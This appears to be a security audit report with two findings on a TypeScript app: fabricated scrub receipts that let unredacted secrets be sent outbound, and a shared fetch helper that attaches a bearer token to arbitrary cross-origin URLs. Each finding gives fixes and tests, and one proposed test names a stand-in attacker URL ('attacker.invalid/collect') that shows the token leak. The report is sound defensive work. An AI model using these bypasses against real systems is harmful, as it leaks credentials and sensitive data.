findings.title: Fabricated scrub receipts can authorize unsanitized Anthropic egress
findings.what: Rule-B transmission trusts caller-supplied `scrubReceipt` and `capReceipt` objects. `validScrubReceipt` at src/lib/anthropic-egress.ts:353 checks only caller-controlled metadata and never proves that `req.body` is the `content` returned by `egressScrub` at src/lib/anthropic-egress.ts:291. A caller can therefore pass an unredacted body containing transcript or secret material, fabricate a receipt with the expected registry ID/mode and nonnegative byte counts, and reach the fetch at src/lib/anthropic-egress.ts:193.
findings.fix: Remove public receipt-based authorization. Expose a send operation that accepts raw content and performs redaction, logging, cap enforcement, and serialization internally, or use an opaque unforgeable scrub result whose exact redacted content is the only body the egress function can transmit.
findings.acceptance: Add a test that submits secret-bearing raw content with a structurally valid fabricated receipt and asserts the fetch implementation is never called; add a positive test proving that only the exact redacted output produced by the trusted scrub path can be sent.
findings.verifyNote: Adversarial re-read confirmed `callAnthropic` serializes `req.body` unchanged at lines 189-193, while receipt validation at lines 353-366 compares no digest, identity, or content and all accepted receipt fields are publicly constructible.

findings.title: Shared server fetch can leak the enterprise bearer token cross-origin
findings.what: `serverFetch` is exported with unrestricted `RequestInfo | URL`, defaults to the session-stored enterprise token, and adds `Authorization: Bearer ...` before calling `fetch` without verifying that the target is same-origin. The `credentials: 'same-origin'` option controls ambient credentials but does not suppress an explicitly supplied Authorization header, so any consumer that passes an absolute attacker-controlled URL sends the bearer token to that origin.
findings.fix: Resolve the input against `location.origin` and reject unless the resulting URL is same-origin (and preferably an allowed dashboard path) before adding Authorization; alternatively make the authenticated primitive accept only relative dashboard paths and provide a separate unauthenticated fetch for external URLs.
findings.acceptance: Add a test calling `serverFetch('https://attacker.invalid/collect')` while a token is present and assert it rejects before invoking fetch; retain a positive test showing a relative `/api/...` request receives the Authorization header.
findings.verifyNote: Adversarial re-read of src/lib/api-client.ts:425-435 confirmed there is no origin or path check between accepting arbitrary RequestInfo/URL and attaching the default bearer token; no inspected batch test constrains cross-origin input.
